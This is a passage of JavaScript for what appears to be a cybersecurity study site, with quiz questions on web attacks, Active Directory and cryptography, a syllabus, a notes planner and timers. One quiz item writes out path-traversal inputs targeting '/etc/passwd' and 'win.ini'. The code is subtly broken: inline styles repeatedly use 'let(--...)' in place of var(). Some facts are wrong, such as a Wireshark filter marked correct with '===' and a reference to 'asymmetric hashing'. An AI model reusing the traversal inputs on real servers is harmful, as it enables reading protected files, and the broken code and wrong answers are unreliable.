        exp: "To prevent XSS, you must use context-aware output encoding (converting characters like < and > into safe HTML entities before rendering them). Standardizing a robust Content Security Policy (CSP) provides an extra defense-in-depth layer."
    },
    {
        q: "Which hashing algorithm is considered cryptographically broken and prone to collision attacks?",
        options: ["SHA-256", "bcrypt", "MD5", "Argon2"],
        correct: 2,
        cat: "crypto",
        domain: "Cryptography",
        exp: "MD5 (Message-Digest 5) is considered cryptographically broken. It suffers from collision vulnerabilities, where two distinct inputs generate the exact same hash output. SHA-256, bcrypt, and Argon2 are currently secure alternatives."
    },
    {
        q: "What Active Directory attack targets a service account with a Service Principal Name (SPN) to extract and crack Kerberos tickets offline?",
        options: ["Golden Ticket Attack", "Kerberoasting", "AS-REP Roasting", "LLMNR Poisoning"],
        correct: 1,
        cat: "systems",
        domain: "Systems & AD",
        exp: "Kerberoasting allows domain users to request a Kerberos service ticket (TGS) for any service account with a registered SPN. Because the ticket is encrypted using the service account's password hash, attackers can crack the ticket offline to retrieve the password."
    },
    {
        q: "What port is standard for DNS zone transfers, which must be secured to prevent network mapping leaks?",
        options: ["Port 53 TCP", "Port 53 UDP", "Port 161 UDP", "Port 80 TCP"],
        correct: 0,
        cat: "network",
        domain: "Network & Recon",
        exp: "DNS zone transfers (AXFR queries) standardly run over Port 53 TCP to ensure reliable delivery of the entire zone database. Standard DNS queries and lookups use Port 53 UDP."
    },
    {
        q: "On a Linux system, what permission bit allows a binary to execute with the privileges of the file owner rather than the user running it?",
        options: ["SUID (Set Owner User ID) bit", "Sticky bit", "SGID (Set Group ID) bit", "Read-Only bit"],
        correct: 0,
        cat: "systems",
        domain: "Systems & AD",
        exp: "The SUID (SetUID) bit allows users to run an executable with the permissions of the file owner (often root). Misconfigured or vulnerable SUID binaries (like custom scripts or outdated system utilities) are a major source of privilege escalation."
    },
    {
        q: "Which attack forces an authenticated user's browser to send a forged HTTP request to a vulnerable web application where the user is currently logged in?",
        options: ["SQL Injection", "Cross-Site Request Forgery (CSRF)", "Reflected XSS", "Server-Side Request Forgery (SSRF)"],
        correct: 1,
        cat: "web",
        domain: "Web Attacks",
        exp: "CSRF exploits the trust a site has in a user's browser. If a user is logged into their bank and visits a malicious site, the malicious site can submit a hidden form (like a money transfer) to the bank, and the browser will automatically attach the user's active session cookies."
    },
    {
        q: "Which protocol is standard for querying databases of domain registration details, registrar contact info, and IP address allocations?",
        options: ["SNMP", "WHOIS", "ICMP", "DHCP"],
        correct: 1,
        cat: "network",
        domain: "Network & Recon",
        exp: "WHOIS is a query and response protocol used for querying databases that store the registered users or assignees of an Internet resource, such as a domain name, an IP address block, or an autonomous system."
    },
    {
        q: "An attacker inputs '../etc/passwd' or '..\\windows\\win.ini' into a file retrieval parameter. What vulnerability is this?",
        options: ["SQL Injection", "Path Traversal (Local File Inclusion)", "Server-Side Request Forgery (SSRF)", "Broken Object Level Authorization (BOLA)"],
        correct: 1,
        cat: "web",
        domain: "Web Attacks",
        exp: "Path Traversal (or Directory Traversal) allows an attacker to read arbitrary files on the server by inputting dot-dot-slash (../) sequences to escape the web root folder directory structure."
    },
    {
        q: "What technique adds random data to passwords before hashing them to guarantee protection against precomputed rainbow table attacks?",
        options: ["Salting", "Padding", "Key Stretching", "AES Shuffling"],
        correct: 0,
        cat: "crypto",
        domain: "Cryptography",
        exp: "Salting involves appending a unique, random string of characters to a password before hashing it. This ensures that even identical passwords hash to completely different values, rendering precomputed rainbow tables useless."
    },
    {
        q: "What protocol runs on port 389 (636 for secure) and is standard for querying and authenticating directory services in Active Directory?",
        options: ["Kerberos", "LDAP (Lightweight Directory Access Protocol)", "SMB (Server Message Block)", "RDP (Remote Desktop Protocol)"],
        correct: 1,
        cat: "systems",
        domain: "Systems & AD",
        exp: "LDAP is standardly used to query AD objects, search groups, lookup user attributes, and perform network authentication. It operates over TCP port 389, and securely over SSL/TLS on port 636."
    },
    {
        q: "What does the OWASP Top 10 list represent?",
        options: ["Top 10 hacking tools on GitHub", "Top 10 most critical web application security risks", "Top 10 operating system exploits", "Top 10 cybercriminal organizations"],
        correct: 1,
        cat: "web",
        domain: "Web Attacks",
        exp: "The OWASP (Open Worldwide Application Security Project) Top 10 is a globally recognized awareness document outlining the ten most critical security risks facing web applications today, updated periodically based on industry telemetry."
    },
    {
        q: "Which Wireshark display filter is correct for isolating HTTP POST requests?",
        options: ["http.post", 'http.request.method === "POST"', "tcp.port === 80", "http.method === \'POST\'"],
        correct: 1,
        cat: "network",
        domain: "Network & Recon",
        exp: "In Wireshark, the display filter 'http.request.method === \"POST\"' isolates frames containing HTTP packets where the request method is POST. Other display filters like 'http.request.method === \"GET\"' filter GET requests."
    },
    {
        q: "In a Windows environment, what database file contains local user account details and password hashes, standardly stored in config folder?",
        options: ["SAM (Security Account Manager) file", "NTDS.dit file", "lsass.exe file", "registry.hive file"],
        correct: 0,
        cat: "systems",
        domain: "Systems & AD",
        exp: "The SAM file stores local user account password hashes on Windows systems (located in C:\\Windows\\System32\\config\\SAM). Active Directory domain password hashes are instead stored in NTDS.dit."
    },
    {
        q: "What type of cipher uses the same secret key for both the encryption of plaintext and the decryption of ciphertext?",
        options: ["Asymmetric Cipher", "Symmetric Cipher", "Hashing Algorithm", "Public Key infrastructure"],
        correct: 1,
        cat: "crypto",
        domain: "Cryptography",
        exp: "Symmetric ciphers (such as AES, DES, ChaCha20) use a single shared key to both encrypt and decrypt data, making them fast and efficient for bulk data encryption."
    },
    {
        q: "An attacker abuses server features to send arbitrary HTTP requests from the backend server to internal/external systems. What vulnerability is this?",
        options: ["Cross-Site Request Forgery (CSRF)", "Cross-Site Scripting (XSS)", "Server-Side Request Forgery (SSRF)", "XML External Entity (XXE)"],
        correct: 2,
        cat: "web",
        domain: "Web Attacks",
        exp: "SSRF (Server-Side Request Forgery) occurs when a web application fetches a remote resource without validating the user-supplied URL. It lets attackers force the server to read or scan internal systems (e.g. AWS metadata endpoint 169.254.169.254) hidden behind a firewall."
    },
    {
        q: "Which tool is a lightweight command-line network packet analyzer built on libpcap, widely used to capture raw packet data?",
        options: ["Nmap", "TCPDump", "Nikto", "Burp Suite"],
        correct: 1,
        cat: "network",
        domain: "Network & Recon",
        exp: "TCPDump is a command-line packet sniffer that captures and displays TCP/IP and other packets being transmitted or received over a network. It is pre-installed on most Linux systems."
    }
];

// Quiz State
let activeQuizCategory = 'all';
let quizPool = [];
let currentQuestionIdx = 0;
let quizScore = 0;
let selectedOptionIdx = null;

// Quiz DOM elements
const startScreen = document.getElementById('quiz-start-screen');
const questionScreen = document.getElementById('quiz-question-screen');
const resultsScreen = document.getElementById('quiz-results-screen');
const categoryContainer = document.getElementById('quiz-category-container');
const startQuizBtn = document.getElementById('start-quiz-btn');

const progressText = document.getElementById('quiz-progress-text');
const scoreTracker = document.getElementById('quiz-score-tracker');
const progressFill = document.getElementById('quiz-progress-fill');
const questionDomain = document.getElementById('quiz-question-domain');
const questionText = document.getElementById('quiz-question-text');
const optionsContainer = document.getElementById('quiz-options-container');
const feedbackContainer = document.getElementById('quiz-feedback-container');
const feedbackTitle = document.getElementById('quiz-feedback-title');
const feedbackText = document.getElementById('quiz-feedback-text');
const nextBtn = document.getElementById('quiz-next-btn');

const resultsScorePercent = document.getElementById('results-score-percent');
const resultsCircleFill = document.getElementById('results-circle-fill');
const resultsGradeBadge = document.getElementById('results-grade-badge');
const resultsSummaryText = document.getElementById('results-summary-text');
const restartBtn = document.getElementById('quiz-restart-btn');

// Choose category chip handler
if (categoryContainer) {
    categoryContainer.querySelectorAll('.filter-chip').forEach(chip => {
        chip.addEventListener('click', () => {
            categoryContainer.querySelectorAll('.filter-chip').forEach(c => c.classList.remove('active'));
            chip.classList.add('active');
            activeQuizCategory = chip.getAttribute('data-quiz-cat');
        });
    });
}

// Shuffle helper
function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

// Initialize quiz session
function initQuizSession() {
    // Filter questions by category
    let filtered = [];
    if (activeQuizCategory === 'all') {
        filtered = [...quizQuestions];
    } else {
        filtered = quizQuestions.filter(q => q.cat === activeQuizCategory);
    }

    // Shuffle pool and select max 10
    shuffleArray(filtered);
    quizPool = filtered.slice(0, 10);

    // Reset state
    currentQuestionIdx = 0;
    quizScore = 0;
    selectedOptionIdx = null;

    // Swap screen
    startScreen.style.display = 'none';
    resultsScreen.style.display = 'none';
    questionScreen.style.display = 'block';

    loadQuizQuestion();
}

if (startQuizBtn) {
    startQuizBtn.addEventListener('click', initQuizSession);
}

// Load Question
function loadQuizQuestion() {
    if (currentQuestionIdx >= quizPool.length) {
        showQuizResults();
        return;
    }

    const currentQ = quizPool[currentQuestionIdx];
    selectedOptionIdx = null;

    // Reset controls
    feedbackContainer.style.display = 'none';
    feedbackContainer.className = 'quiz-feedback-box';
    nextBtn.style.display = 'none';

    // Progress text and fill
    progressText.textContent = `Question ${currentQuestionIdx + 1} of ${quizPool.length}`;
    const percentComplete = ((currentQuestionIdx) / quizPool.length) * 100;
    progressFill.style.width = `${percentComplete}%`;
    
    // Score tracking
    const scorePercent = currentQuestionIdx === 0 ? 0 : Math.round((quizScore / currentQuestionIdx) * 100);
    scoreTracker.textContent = `Score: ${scorePercent}%`;

    // Question Details
    questionDomain.textContent = currentQ.domain;
    questionText.textContent = currentQ.q;

    // Render options
    optionsContainer.innerHTML = '';
    currentQ.options.forEach((opt, idx) => {
        const btn = document.createElement('button');
        btn.className = 'quiz-option';
        btn.innerHTML = `
            <div class="quiz-option-marker">${String.fromCharCode(65 + idx)}</div>
            <span>${opt}</span>
        `;
        btn.addEventListener('click', () => handleOptionSelection(idx));
        optionsContainer.appendChild(btn);
    });
}

// Option selection handler
function handleOptionSelection(idx) {
    if (selectedOptionIdx !== null) return; // Prevent multiple answers

    selectedOptionIdx = idx;
    const currentQ = quizPool[currentQuestionIdx];
    const isCorrect = (idx === currentQ.correct);
    const optionsElements = optionsContainer.querySelectorAll('.quiz-option');

    // Disable all options
    optionsElements.forEach((el, index) => {
        el.classList.add('disabled');
        // Highlight correct answer in green
        if (index === currentQ.correct) {
            el.classList.add('correct');
        }
    });

    // If incorrect, highlight selected in red
    if (!isCorrect) {
        optionsElements[idx].classList.add('incorrect');
        feedbackTitle.textContent = "Access Denied / Incorrect Answer";
        feedbackContainer.classList.add('incorrect-feedback');
    } else {
        quizScore++;
        feedbackTitle.textContent = "Access Granted / Correct Answer!";
        feedbackContainer.classList.add('correct-feedback');
    }

    // Show explanation
    feedbackText.textContent = currentQ.exp;
    feedbackContainer.style.display = 'block';
    nextBtn.style.display = 'inline-flex';
    
    // Focus on next button
    nextBtn.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
}

if (nextBtn) {
    nextBtn.addEventListener('click', () => {
        currentQuestionIdx++;
        if (currentQuestionIdx >= quizPool.length) {
            showQuizResults();
        } else {
            loadQuizQuestion();
        }
    });
}

// Show Results Screen
function showQuizResults() {
    questionScreen.style.display = 'none';
    resultsScreen.style.display = 'block';

    // Calculate percentage
    const finalScorePercent = Math.round((quizScore / quizPool.length) * 100);
    resultsScorePercent.textContent = `${finalScorePercent}%`;

    // Draw radial chart offset (circumference of r=45 circle is 2 * pi * 45 = 283)
    const circumference = 283;
    const offset = circumference - (finalScorePercent / 100) * circumference;
    resultsCircleFill.style.strokeDashoffset = offset;

    // Calculate rank and color
    let grade = '';
    let colorAccent = '#00ff66';
    let summary = '';

    if (finalScorePercent >= 90) {
        grade = 'ELITE PENETRATION TESTER (RANK: L33T)';
        colorAccent = '#00ff66';
        summary = `Outstanding performance! You answered ${quizScore} out of ${quizPool.length} questions correctly. Your mastery of web attacks, networking protocols, and privilege escalation concepts is excellent. You are ready for advanced security challenges!`;
    } else if (finalScorePercent >= 70) {
        grade = 'CERTIFIED SECURITY ANALYST';
        colorAccent = '#00ffcc';
        summary = `Great job! You answered ${quizScore} out of ${quizPool.length} questions correctly. You have a solid grasp of core vulnerability concepts, Active Directory architecture, and encryption techniques. Keep studying to reach the Elite rank!`;
    } else if (finalScorePercent >= 50) {
        grade = 'JUNIOR SECURITY ASSOCIATE';
        colorAccent = '#eab308';
        summary = `Good effort. You answered ${quizScore} out of ${quizPool.length} questions correctly. You understand the basics, but there are some critical areas in systems auditing, port mapping, and exploit payloads that need review. Check out the Cheat Sheets in the PDF tab!`;
    } else {
        grade = 'SCRIPT KIDDIE (RETRY EXAM)';
        colorAccent = '#ef4444';
        summary = `You answered ${quizScore} out of ${quizPool.length} questions correctly. Hacking is a continuous learning process! Review the certifications, timelines, and channels listed in the directory to strengthen your cybersecurity foundations, then try again.`;
    }

    // Style results
    resultsGradeBadge.textContent = grade;
    resultsGradeBadge.style.borderColor = colorAccent;
    resultsGradeBadge.style.color = colorAccent;
    resultsGradeBadge.style.background = `rgba(${colorAccent === '#00ff66' ? '0, 255, 102' : colorAccent === '#00ffcc' ? '0, 255, 204' : colorAccent === '#ef4444' ? '239, 68, 68' : '234, 179, 8'}, 0.08)`;
    resultsGradeBadge.style.textShadow = `0 0 10px ${colorAccent}33`;
    resultsCircleFill.style.stroke = colorAccent;
    
    resultsSummaryText.textContent = summary;
}

if (restartBtn) {
    restartBtn.addEventListener('click', () => {
        resultsScreen.style.display = 'none';
        startScreen.style.display = 'block';
    });
}


// --- DEEP LINK STAGE NAVIGATION FROM OVERVIEW ---
window.goToStageCard = function(stageId) {
    // 1. Switch active tab to roadmap
    const roadmapLink = document.querySelector('.nav-link[data-tab="roadmap"]');
    if (roadmapLink) {
        roadmapLink.click();
    }

    // 2. Close all stage cards, then open the specific stageId card
    document.querySelectorAll('.timeline-stage-card').forEach(card => {
        card.classList.remove('open');
    });

    const targetCard = document.getElementById(`stage-card-${stageId}`);
    if (targetCard) {
        targetCard.classList.add('open');
        // 3. Scroll the stage card into view
        setTimeout(() => {
            targetCard.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }, 300);
    }
};

// --- STUDY PLANNER & NOTES ENGINE ---
const weeklySyllabus = {
    1: [
        { wk: 1, topic: "Computer Hardware & OS Basics", focus: "Linux vs Windows internals, memory addressing, filesystems basics, bios/uefi", hrs: "10-12 hrs" },
        { wk: 2, topic: "Command Line Mastery", focus: "Bash shell navigation, basic scripts, text processing, pipe redirection", hrs: "12-15 hrs" },
        { wk: 3, topic: "Networking Essentials", focus: "IP addresses, subnets, routers, switches, OSI layers model, ICMP/ping", hrs: "15-18 hrs" },
        { wk: 4, topic: "Basic Security Concepts", focus: "CIA triad, authorization models, symmetric vs asymmetric hashing, basic threats", hrs: "10-12 hrs" }
    ],
    2: [
        { wk: 1, topic: "Core Networking Protocols", focus: "TCP/IP handshake, DNS lookup, DHCP leases, HTTP/S headers, packets analysis", hrs: "15-18 hrs" },
        { wk: 2, topic: "Port Scanning & Host Discovery", focus: "Nmap host sweeps, SYN/TCP connect scans, service detection, operating system flags", hrs: "15-20 hrs" },
        { wk: 3, topic: "Traffic Analysis with Wireshark", focus: "Capturing interfaces, Wireshark packet filters, isolating HTTP POST/TCP streams", hrs: "12-16 hrs" },
        { wk: 4, topic: "Network Services Enumeration", focus: "Querying FTP logins, Telnet/SSH audits, SMB share lists, SMTP user listings", hrs: "15-18 hrs" }
    ],
    3: [
        { wk: 1, topic: "Web App Architecture & OWASP", focus: "HTML forms, Cookie states, HTTP methods, session tokens, OWASP Top 10 introduction", hrs: "12-15 hrs" },
        { wk: 2, topic: "Web Reconnaissance & Fuzzing", focus: "Subdomain parsing (Subfinder), folder fuzzing (Gobuster/FFUF), tech profiles (Wappalyzer)", hrs: "15-18 hrs" },
        { wk: 3, topic: "Client-Side Vulnerabilities", focus: "Reflected, Stored, and DOM-based Cross-Site Scripting (XSS), CSRF token theft", hrs: "16-20 hrs" },
        { wk: 4, topic: "Server-Side Exploitations", focus: "SQL injection payload creation, OS Command execution parameters, LFI/RFI traversals", hrs: "20-25 hrs" }
    ],
    4: [
        { wk: 1, topic: "Active Directory Foundations", focus: "Forest structures, Domain Controllers, GPO distribution, Kerberos ticket exchange", hrs: "15-18 hrs" },
        { wk: 2, topic: "Active Directory Enumeration", focus: "BloodHound ingestion (SharpHound), PowerView commands, LDAP querying filters", hrs: "18-22 hrs" },
        { wk: 3, topic: "Kerberos Ticket Exploits", focus: "Kerberoasting SPN logins, AS-REP roasting, Golden/Silver Ticket generation", hrs: "20-25 hrs" },
        { wk: 4, topic: "Network Tunneling & Pivoting", focus: "SSH port forwards, Chisel socks proxies, Ligolo-ng interface routing", hrs: "15-18 hrs" }
    ],
    5: [
        { wk: 1, topic: "AV & EDR Evasion Foundations", focus: "Signature detection mechanics, obfuscating PowerShell parameters, C# wrapper compiles", hrs: "18-22 hrs" },
        { wk: 2, topic: "Advanced Web Exploits", focus: "Server-Side Request Forgery (SSRF) AWS metadata queries, XML External Entity (XXE)", hrs: "20-24 hrs" },
        { wk: 3, topic: "C2 Frameworks & Reverse Shells", focus: "Metasploit handlers, Sliver C2 configuration, custom shellcode, process injection", hrs: "22-26 hrs" },
        { wk: 4, topic: "Privilege Escalation Techniques", focus: "Linux SUID binaries, Windows scheduled task replacements, token impersonation", hrs: "20-25 hrs" }
    ],
    6: [
        { wk: 1, topic: "CPU Assembly & Registers", focus: "x86 CPU instruction pointers, EAX/ESP registers, stack frames, push/pop structures", hrs: "16-20 hrs" },
        { wk: 2, topic: "Buffer Overflow Exploitations", focus: "Controlling EIP registers, pattern offset calculations, isolating bad characters", hrs: "20-25 hrs" },
        { wk: 3, topic: "Windows Stack Protections Bypass", focus: "Structured Exception Handling (SEH) overrides, Return-Oriented Programming (ROP)", hrs: "22-28 hrs" },
        { wk: 4, topic: "Vulnerability Discovery & CVEs", focus: "Software fuzzing inputs, writing exploit PoCs, responsible disclosure workflows", hrs: "16-20 hrs" }
    ]
};

// Planner DOM nodes
const stageSelect = document.getElementById('planner-stage-select');
const scheduleTbody = document.getElementById('planner-schedule-tbody');
const notesArea = document.getElementById('study-notes-area');
const notesSaveStatus = document.getElementById('notes-save-status');
const copyNotesBtn = document.getElementById('copy-notes-btn');
const clearNotesBtn = document.getElementById('clear-notes-btn');

let activePlannerStage = 1;
let saveTimeout = null;

// Render weekly schedule based on dropdown stage
function renderWeeklySchedule() {
    if (!scheduleTbody) return;
    scheduleTbody.innerHTML = '';
    
    const weeks = weeklySyllabus[activePlannerStage] || [];
    
    weeks.forEach(item => {
        const storageKey = `roadmap-planner-wk-s${activePlannerStage}-w${item.wk}`;
        const isChecked = localStorage.getItem(storageKey) === 'true';
        
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td style="font-family: 'JetBrains Mono', monospace; font-weight: 700; text-align: center; color: let(--color-accent);">W${item.wk}</td>
            <td>
                <strong style="color: let(--text-primary); font-size: 0.92rem; display: block; margin-bottom: 4px;">${item.topic}</strong>
                <span style="font-size: 0.85rem; color: let(--text-secondary); line-height: 1.4; display: block;">${item.focus}</span>
            </td>
            <td style="font-family: 'JetBrains Mono', monospace; font-size: 0.82rem;">${item.hrs}</td>
            <td>
                <input type="checkbox" class="syllabus-checkbox" id="${storageKey}" ${isChecked ? 'checked' : ''}>
            </td>
        `;
        
        // Add change listener to checkboxes
        const checkbox = tr.querySelector('.syllabus-checkbox');
        checkbox.addEventListener('change', () => {
            localStorage.setItem(storageKey, checkbox.checked);
        });
        
        scheduleTbody.appendChild(tr);
    });
}

// Notes Management
function loadStageNotes() {
    if (!notesArea) return;
    const savedNotes = localStorage.getItem(`roadmap-study-notes-s${activePlannerStage}`);
    notesArea.value = savedNotes || '';
}

function triggerNotesAutoSave() {
    if (!notesArea) return;
    
    // Show saving status (subtle indicator)
    notesSaveStatus.innerHTML = `<svg viewBox="0 0 24 24" style="width: 14px; height: 14px; fill: currentColor; animation: spin-status 1s linear infinite;"><path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.01-.25 1.97-.7 2.8l1.46 1.46C19.54 15.03 20 13.57 20 12c0-4.42-3.58-8-8-8zm-1.7 10.3c-.45-.83-.7-1.79-.7-2.8 0-3.31 2.69-6 6-6v3l4-4-4-4v3c-4.42 0-8 3.58-8 8 0 1.57.46 3.03 1.24 4.26l1.46-1.46z"/></svg> Saving...`;
    notesSaveStatus.style.color = 'let(--color-secondary)';
    notesSaveStatus.classList.add('visible');
    
    clearTimeout(saveTimeout);
    saveTimeout = setTimeout(() => {
        localStorage.setItem(`roadmap-study-notes-s${activePlannerStage}`, notesArea.value);
        notesSaveStatus.innerHTML = `<svg viewBox="0 0 24 24" style="width: 14px; height: 14px; fill: currentColor;"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Saved`;
        notesSaveStatus.style.color = 'let(--color-success)';
        setTimeout(() => {
            notesSaveStatus.classList.remove('visible');
        }, 1500);
    }, 1000);
}

// Add dropdown change listener
if (stageSelect) {
    stageSelect.addEventListener('change', () => {
        // Save current notes first
        if (notesArea) {
            localStorage.setItem(`roadmap-study-notes-s${activePlannerStage}`, notesArea.value);
        }
        
        activePlannerStage = parseInt(stageSelect.value, 10);
        renderWeeklySchedule();
        loadStageNotes();
    });
}

// Add notepad keystroke listener
if (notesArea) {
    notesArea.addEventListener('input', triggerNotesAutoSave);
}

// Copy Notes Action
if (copyNotesBtn) {
    copyNotesBtn.addEventListener('click', () => {
        if (!notesArea) return;
        notesArea.select();
        document.execCommand('copy');
        
        const oldText = copyNotesBtn.textContent;
        copyNotesBtn.textContent = 'Copied!';
        copyNotesBtn.style.borderColor = 'let(--color-success)';
        copyNotesBtn.style.color = 'let(--color-success)';
        
        setTimeout(() => {
            copyNotesBtn.textContent = oldText;
            copyNotesBtn.style.borderColor = '';
            copyNotesBtn.style.color = '';
        }, 2000);
    });
}

// Clear Notes Action
if (clearNotesBtn) {
    clearNotesBtn.addEventListener('click', () => {
        if (!notesArea) return;
        if (confirm('Are you sure you want to clear your notes for this stage?')) {
            notesArea.value = '';
            localStorage.setItem(`roadmap-study-notes-s${activePlannerStage}`, '');
            triggerNotesAutoSave();
        }
    });
}

// Setup style for status spinning icon
const styleSheet = document.createElement("style");
styleSheet.innerText = `
    @keyframes spin-status {
        from { transform: rotate(0deg); }
        to { transform: rotate(360deg); }
    }
`;
document.head.appendChild(styleSheet);

// Initial Planner loading
renderWeeklySchedule();
loadStageNotes();


// --- FOCUS STATION: POMODORO TIMER & EXAM COUNTDOWN ---
const pomodoroTimeEl = document.getElementById('pomodoro-time');
const pomodoroStatusEl = document.getElementById('pomodoro-status');
const pomodoroStartBtn = document.getElementById('pomodoro-start');
const pomodoroPauseBtn = document.getElementById('pomodoro-pause');
const pomodoroResetBtn = document.getElementById('pomodoro-reset');

const focusTabPomodoro = document.getElementById('focus-tab-pomodoro');
const focusTabCountdown = document.getElementById('focus-tab-countdown');
const focusPanelPomodoro = document.getElementById('focus-panel-pomodoro');
const focusPanelCountdown = document.getElementById('focus-panel-countdown');

const examDateInput = document.getElementById('exam-date-input');
const setExamDateBtn = document.getElementById('set-exam-date-btn');
const countdownDisplay = document.getElementById('countdown-display');
const countdownPlaceholder = document.getElementById('countdown-placeholder');

const cDays = document.getElementById('countdown-days');
const cHours = document.getElementById('countdown-hours');
const cMins = document.getElementById('countdown-mins');
const cSecs = document.getElementById('countdown-secs');

// Tab selection
if (focusTabPomodoro && focusTabCountdown) {
    focusTabPomodoro.addEventListener('click', () => {
        focusTabPomodoro.classList.add('active');
        focusTabCountdown.classList.remove('active');
        focusPanelPomodoro.style.display = 'block';
        focusPanelCountdown.style.display = 'none';
    });
    focusTabCountdown.addEventListener('click', () => {
        focusTabCountdown.classList.add('active');
        focusTabPomodoro.classList.remove('active');
        focusPanelCountdown.style.display = 'block';
        focusPanelPomodoro.style.display = 'none';
    });
}

// Pomodoro state
let pomodoroInterval = null;
let timeLeft = 25 * 60; // 25 minutes
let isTimerRunning = false;
let timerMode = 'focus'; // focus or break

function updateTimerDisplay() {
    if (!pomodoroTimeEl) return;
    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;
    pomodoroTimeEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

function startPomodoro() {
    if (isTimerRunning) return;
    isTimerRunning = true;
    pomodoroStartBtn.style.display = 'none';
    pomodoroPauseBtn.style.display = 'inline-flex';
    
    pomodoroInterval = setInterval(() => {
        timeLeft--;
        updateTimerDisplay();
        
        if (timeLeft <= 0) {
            clearInterval(pomodoroInterval);
            isTimerRunning = false;
            pomodoroStartBtn.style.display = 'inline-flex';
            pomodoroPauseBtn.style.display = 'none';
            
            // Alert user & switch mode
            if (timerMode === 'focus') {
                alert("Focus session complete! Take a 5-minute break.");
                timerMode = 'break';
                timeLeft = 5 * 60;
                if (pomodoroStatusEl) {
                    pomodoroStatusEl.textContent = 'REST BREAK';
                    pomodoroStatusEl.style.color = 'let(--color-accent)';
                    pomodoroStatusEl.style.borderColor = 'rgba(0, 255, 102, 0.2)';
                    pomodoroStatusEl.style.background = 'rgba(0, 255, 102, 0.06)';
                }
            } else {
                alert("Break over! Time to focus.");
                timerMode = 'focus';
                timeLeft = 25 * 60;
                if (pomodoroStatusEl) {
                    pomodoroStatusEl.textContent = 'FOCUS TIME';
                    pomodoroStatusEl.style.color = 'let(--color-secondary)';
                    pomodoroStatusEl.style.borderColor = 'rgba(6, 182, 212, 0.2)';
                    pomodoroStatusEl.style.background = 'rgba(6, 182, 212, 0.06)';
                }
            }
            updateTimerDisplay();
        }
    }, 1000);
}

function pausePomodoro() {
    clearInterval(pomodoroInterval);
    isTimerRunning = false;
    pomodoroStartBtn.style.display = 'inline-flex';
    pomodoroPauseBtn.style.display = 'none';
}

function resetPomodoro() {
    clearInterval(pomodoroInterval);
    isTimerRunning = false;
    pomodoroStartBtn.style.display = 'inline-flex';
    pomodoroPauseBtn.style.display = 'none';
    timeLeft = timerMode === 'focus' ? 25 * 60 : 5 * 60;
    updateTimerDisplay();
}

if (pomodoroStartBtn) pomodoroStartBtn.addEventListener('click', startPomodoro);
if (pomodoroPauseBtn) pomodoroPauseBtn.addEventListener('click', pausePomodoro);
if (pomodoroResetBtn) pomodoroResetBtn.addEventListener('click', resetPomodoro);

// Exam Countdown state
let countdownInterval = null;

function startCountdown() {
    const targetDateStr = localStorage.getItem('roadmap-exam-target-date');
    if (!targetDateStr) {
        if (countdownDisplay) countdownDisplay.style.display = 'none';
        if (countdownPlaceholder) countdownPlaceholder.style.display = 'block';
        return;
    }

    if (examDateInput) examDateInput.value = targetDateStr;
    const targetDate = new Date(targetDateStr + "T00:00:00").getTime();

    if (countdownInterval) clearInterval(countdownInterval);

    function updateCountdown() {
        const now = new Date().getTime();
        const difference = targetDate - now;

        if (difference <= 0) {
            clearInterval(countdownInterval);
            if (countdownDisplay) countdownDisplay.innerHTML = '<span style="color: let(--color-success); font-size: 0.95rem; text-shadow: 0 0 10px rgba(0, 255, 102, 0.2);">EXAM DAY! GOOD LUCK HACKER!</span>';
            if (countdownDisplay) countdownDisplay.style.display = 'block';
            if (countdownPlaceholder) countdownPlaceholder.style.display = 'none';
            return;
        }

        const days = Math.floor(difference / (1000 * 60 * 60 * 24));
        const hours = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((difference % (1000 * 60)) / 1000);

        if (cDays) cDays.textContent = days.toString().padStart(2, '0');
        if (cHours) cHours.textContent = hours.toString().padStart(2, '0');
        if (cMins) cMins.textContent = minutes.toString().padStart(2, '0');
        if (cSecs) cSecs.textContent = seconds.toString().padStart(2, '0');

        if (countdownDisplay) countdownDisplay.style.display = 'block';
        if (countdownPlaceholder) countdownPlaceholder.style.display = 'none';
    }

    updateCountdown();
    countdownInterval = setInterval(updateCountdown, 1000);
}

if (setExamDateBtn) {
    setExamDateBtn.addEventListener('click', () => {
        if (!examDateInput) return;
        const val = examDateInput.value;
        if (!val) {
            alert('Please select a valid date.');
            return;
        }
        localStorage.setItem('roadmap-exam-target-date', val);
        startCountdown();
    });
}

// Start countdown initially
startCountdown();




// --- ADHD FOCUS HUB INTERACTIVE HANDLERS ---
const adhdStateCards = document.querySelectorAll('.focus-state-card');
const adhdRecomText = document.getElementById('adhd-recommendation-text');
const adhdRecomActions = document.getElementById('adhd-recommendation-actions');

const adhdQuestTitle = document.getElementById('adhd-quest-title');
const adhdQuestDesc = document.getElementById('adhd-quest-desc');
const adhdQuestReward = document.getElementById('adhd-quest-reward');
const adhdGenerateQuestBtn = document.getElementById('adhd-generate-quest-btn');
const adhdClaimQuestBtn = document.getElementById('adhd-claim-quest-btn');

const adhdRecommendations = {
    hyperfocused: {
        text: "Ride the wave! Deep dive into Stage 4 Active Directory or Stage 6 Assembly. Open the Project Hub and build a hands-on project to test your skills.",
        actions: [
            { text: "Go to Stage 4", click: "goToStageCard(4)" },
            { text: "Open Project Hub", click: "document.querySelector('.nav-link[data-tab=\"projects\"]').click()" }
        ]
    },
    distracted: {
        text: "Brain is bouncing? Don't force long reading. Try a quick, engaging tool trial: open the Tool Finder and search for 'Wireshark' or 'Nmap', or trigger the Dopamine Side Quest below to get a 5-minute win.",
        actions: [
            { text: "Open Tool Finder", click: "document.querySelector('.nav-link[data-tab=\"tools\"]').click()" },
            { text: "Generate Side Quest", click: "document.getElementById('adhd-generate-quest-btn').click()" }
        ]
    },
    zombie: {
        text: "Low energy/motivation? Do something extremely low-friction: watch a video in the Channel Directory, review the CompTIA PDF Cheat Sheet, or use the Lofi Soundboard on the right to gently transition back into focus.",
        actions: [
            { text: "Open Channel Directory", click: "document.querySelector('.nav-link[data-tab=\"resources\"]').click()" },
